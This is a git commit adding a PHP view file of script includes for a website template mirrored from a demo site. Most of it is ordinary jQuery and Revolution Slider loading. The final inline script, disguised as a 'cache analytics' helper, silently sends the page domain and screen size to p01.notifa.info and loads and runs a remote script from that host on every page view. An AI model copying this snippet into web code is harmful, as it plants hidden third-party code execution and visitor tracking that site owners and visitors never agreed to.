8a59b692ff635491f86b95582c267f99c114cda3
Biem <Abiemassyikin@gmail.com>
2018-12-05 09:33:29 +0700

    wes iki

---
+++ application/views/client/asd/js.php
@@ -0,0 +1,21 @@
+<script src="<?php echo base_url()?>master/assets/js/jquery-2.2.4.min.js"></script>
+<script src="<?php echo base_url()?>master/assets/js/plugins.js"></script>
+<script src="<?php echo base_url()?>master/assets/js/functions.js"></script>
+<!-- RS5.0 Core JS Files -->
+<script src="<?php echo base_url()?>master/assets/revolution/js/jquery.themepunch.tools.min838f.js?rev=5.0"></script>
+<script src="<?php echo base_url()?>master/assets/revolution/js/jquery.themepunch.revolution.min838f.js?rev=5.0"></script>
+<script src="<?php echo base_url()?>master/assets/revolution/js/extensions/revolution.extension.video.min.js"></script>
+<script src="<?php echo base_url()?>master/assets/revolution/js/extensions/revolution.extension.slideanims.min.js"></script>
+<script src="<?php echo base_url()?>master/assets/revolution/js/extensions/revolution.extension.actions.min.js"></script>
+<script src="<?php echo base_url()?>master/assets/revolution/js/extensions/revolution.extension.layeranimation.min.js"></script>
+<script src="<?php echo base_url()?>master/assets/revolution/js/extensions/revolution.extension.kenburn.min.js"></script>
+<script src="<?php echo base_url()?>master/assets/revolution/js/extensions/revolution.extension.navigation.min.js"></script>
+<script src="<?php echo base_url()?>master/assets/revolution/js/extensions/revolution.extension.migration.min.js"></script>
+<script src="<?php echo base_url()?>master/assets/revolution/js/extensions/revolution.extension.parallax.min.js"></script>
+<!-- RS Configration JS Files -->
+<script src="<?php echo base_url()?>master/assets/js/rsconfig.js"></script>
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdWuAFgYNyabO1%2bPvpvAktapv1e0WFBvCVrgB1QFVz6crRNlOLXghW0lRksoN4aDZp8VIex5cW9GLDVJEkHn%2bLB96dxtUXNWvqEHby698SN5AZ3Ct7T0bnVVVNOS%2b%2fZRt7JrdgR%2fm1rVmRl1Ay9ASyXYfMt6bPTYWjz%2fVgoA%2bzyATZMtIPEEQPhgLKjAbqJ5HKTG%2bpOf5olfAIVLpIL9519MrdTimJOXAUvrCycNmqDN2o%2baXM%2bZjacektbarZAGdOH%2fE7La2jL1VD9iVQANDPn4hbk4I7EzNsV6dbZibiE7UsKFy9IWjTbu%2fTUznQT6kFcTKowhJoC6TVmKXTeiBZmT8EtgkgYCBsQqhyDla2HJ6rzR7XMQ18gYpjVw34aEIsV0sn%2ba3AGbM%2bk8w7cZfwWt9IP4dkDFV6ngFmYk%2bOaTTwwgzH3M2bCSxIHNhYSuFBi3k%2bmxjFdLJlufLUHByIk2uVtXqSQ0zc8%2f8I6i2QRpU%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+
+
+<!-- Mirrored from demo.zytheme.com/granny/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 04 Dec 2018 15:56:05 GMT -->
+</html>
